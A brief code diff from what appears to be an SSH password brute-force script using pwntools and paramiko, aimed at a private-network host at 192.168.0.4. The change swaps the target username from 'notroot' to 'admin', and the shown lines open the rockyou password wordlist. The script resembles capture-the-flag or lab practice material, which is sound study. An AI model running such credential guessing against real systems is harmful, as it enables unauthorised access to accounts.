@@ -5,7 +5,7 @@ from pwn import *
 import paramiko
 
 host =  "192.168.0.4"
-username = "notroot"
+username = "admin"
 attempts = 0
 
 with open("/usr/share/wordlists/rockyou.txt", "r") as password_list:
